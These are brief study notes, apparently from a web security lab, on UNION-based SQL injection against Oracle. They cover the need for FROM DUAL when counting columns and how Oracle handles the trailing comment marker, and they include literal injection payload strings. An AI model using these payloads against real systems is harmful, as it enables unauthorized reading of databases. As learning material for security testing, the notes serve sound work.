Notes:

- Every `SELECT` on Oracle must use `FROM`, so you can't just do `' UNION SELECT NULL,NULL,â€¦--` to determine the number of columns.
- Every Oracle DB has a `DUAL` table that can be used, like: `' UNION SELECT NULL,NULL FROM DUAL--`
- A trailing `--` is enough to comment out the remainder of the line on Oracle, unlike MySQL which needs it to be followed by a space.
